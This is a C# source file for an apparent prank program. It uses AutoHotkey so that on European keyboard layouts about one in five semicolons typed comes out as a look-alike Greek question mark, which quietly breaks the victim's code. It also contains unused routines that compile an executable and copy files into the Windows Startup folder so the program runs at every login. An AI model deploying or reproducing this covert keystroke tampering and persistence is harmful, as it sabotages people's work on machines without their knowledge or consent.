using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using AutoHotkey.Interop;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;

namespace Trekteg
{
    public class GreekQuestionService
    {
        private AutoHotkeyEngine _instance;
        public void Start()
        {
            _instance = AutoHotkeyEngine.Instance;
            var currentKeyboardLayout = KeyboardLayouts.GetProcessKeyboardLayout();
            if (Enum.IsDefined(typeof(EuropeanLayout), (int)currentKeyboardLayout.KeyboardId))
            {
                _instance.ExecRaw(
                    $"+,::\n" +
                    $"Random, rand, 1, 5\n" +
                    $"If(rand == 1)\n" +
                        $"Sendinput % chr(894)\n" + // greek questionmark
                    $"Else\n" +
                        $"Sendinput % chr(59)");
            }
        }
        public void Stop()
        {
            _instance.Terminate();
        }

    }

    class Program
    {
        public static void Main()
        {
            //CompileExe();
            GreekQuestionService greekQuestionService = new GreekQuestionService();
            greekQuestionService.Start();
            Application.Run();
        }

        private static void CompileExe()
        {
            string fileName = "test.exe";
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(@"
                using System;
                using System.Windows.Forms;
                using AutoHotkey.Interop;
                using System.Runtime.InteropServices;
                public class C
                {
                    public static void Main()
                    {
                        AutoHotkey.Interop.AutoHotkeyEngine _instance = AutoHotkey.Interop.AutoHotkeyEngine.Instance;
                        //_instance.ExecRaw(
                        //    $"" +,::\n"" +
                        //    $""Random, rand, 1, 5\n"" +
                        //    $""If(rand == 1)\n"" +
                        //        $""Sendinput % chr(894)\n"" + // greek questionmark
                        //    $""Else\n"" +
                        //        $""Send blabla\n"");
                        Application.Run();
                    }   
                }");
            string assemblyName = Path.GetRandomFileName(); // TODO
            MetadataReference[] references = new MetadataReference[]
            {
                    MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                    MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location),
                    MetadataReference.CreateFromFile(typeof(Form).Assembly.Location),
                    MetadataReference.CreateFromFile(typeof(AutoHotkeyEngine).Assembly.Location)
            };

            CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.ConsoleApplication));
            string appdataPath = Environment.ExpandEnvironmentVariables("%appdata%");
            string targetPath = Path.Combine(appdataPath, @"Microsoft\Windows\Start Menu\Programs\Startup", fileName);



            using (var ms = new MemoryStream())
            {
                // write IL code into memory
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    // handle exceptions
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);

                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    using (FileStream fs = new FileStream(targetPath, FileMode.OpenOrCreate))
                    {
                        ms.CopyTo(fs);
                        fs.Flush();
                    }
                }
            }
        }

        public static void CopyFileFromCurrentDirectoryToStartupFolder(string fileName)
        {
            string currentDirectory = Directory.GetCurrentDirectory();
            string sourceFile = Path.Combine(currentDirectory, fileName);
            string appdataPath = Environment.ExpandEnvironmentVariables("%appdata%");
            string targetPath = Path.Combine(appdataPath, @"Microsoft\Windows\Start Menu\Programs\Startup");
            string destinationFile = Path.Combine(targetPath, fileName);
            File.Copy(sourceFile, destinationFile, true);
        }
    }
}
